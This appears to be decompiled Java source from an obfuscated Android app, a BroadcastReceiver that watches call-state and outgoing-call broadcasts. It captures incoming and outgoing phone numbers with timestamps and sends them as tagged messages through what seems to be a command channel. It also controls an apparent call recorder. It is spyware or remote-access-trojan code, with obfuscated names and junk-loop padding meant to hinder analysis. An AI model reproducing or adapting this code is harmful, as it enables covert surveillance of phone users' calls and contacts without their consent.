package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
import java.text.DateFormat;
import java.util.Calendar;
import java.util.Date;
/* loaded from: classes.dex */
public class yxqfbvbsjdvwsmtlqnzkugwowxitzawgxivzignllggleibxeg33 extends BroadcastReceiver {

    /* renamed from: a */
    private static String f449a = null;

    /* renamed from: b */
    private static int f450b = 0;

    /* renamed from: c */
    private static boolean f451c = false;

    /* renamed from: d */
    public static String f452d = "";

    /* renamed from: e */
    public static String f453e = "";

    /* renamed from: a */
    public void m81a(String str, String str2, String str3) {
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            String str4 = C0045d.f192g;
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(str4, (str + "|" + str2 + "|" + str3).getBytes());
        }
    }

    /* renamed from: b */
    public void m80b(Context context, int i, String str) {
        String format = DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
        int i2 = f450b;
        if (i2 == i) {
            return;
        }
        if (i != 0) {
            if (i == 1) {
                try {
                    f451c = true;
                    f449a = format;
                    f452d = str != null ? str : "null";
                    m77e(context, str, f449a);
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } else if (i == 2) {
                if (i2 != 1) {
                    f451c = false;
                    f449a = format;
                    m74h(context, f452d, format);
                } else {
                    f451c = true;
                    f449a = format;
                    m79c(context, f452d, format);
                }
            }
        } else if (i2 == 1) {
            try {
                m76f(context, f452d, f449a);
            } catch (Exception unused2) {
                Boolean bool2 = Boolean.TRUE;
                while (bool2.booleanValue()) {
                    bool2 = Boolean.FALSE;
                }
                while (bool2.booleanValue()) {
                    bool2 = Boolean.FALSE;
                }
                while (bool2.booleanValue()) {
                    bool2 = Boolean.FALSE;
                }
                while (bool2.booleanValue()) {
                    bool2 = Boolean.FALSE;
                }
            }
        } else if (f451c) {
            m78d(context, f452d, f449a, new Date());
        } else {
            m75g(context, f452d, f449a, new Date());
        }
        f450b = i;
    }

    /* renamed from: c */
    protected void m79c(Context context, String str, String str2) {
        f453e = "IN";
        if (!hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.m152f(Boolean.FALSE);
        }
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@ens", str, str2.toString());
        }
    }

    /* renamed from: d */
    protected void m78d(Context context, String str, String str2, Date date) {
        if (hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z = false;
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.stop();
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.reset();
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.release();
        }
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@ene", str, str2.toString());
        }
    }

    /* renamed from: e */
    protected void m77e(Context context, String str, String str2) {
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@onn", str, str2.toString());
        }
    }

    /* renamed from: f */
    protected void m76f(Context context, String str, String str2) {
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@mc", str, str2.toString());
        }
    }

    /* renamed from: g */
    protected void m75g(Context context, String str, String str2, Date date) {
        if (hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z = false;
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.stop();
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.reset();
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f295A.release();
        }
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@oge", str, str2.toString());
        }
    }

    /* renamed from: h */
    protected void m74h(Context context, String str, String str2) {
        f453e = "OUT";
        if (!hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f330z) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.m152f(Boolean.FALSE);
        }
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            m81a("@ogs", str, str2.toString());
        }
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        try {
            if (!intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
                String string = intent.getExtras().getString("state");
                String string2 = intent.getExtras().getString("incoming_number");
                int i = 0;
                if (!string.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    if (string.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        i = 2;
                    } else if (string.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        i = 1;
                    }
                }
                m80b(context, i, string2);
                return;
            }
            try {
                f452d = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
            } catch (Exception unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        } catch (Exception unused2) {
        }
    }
}
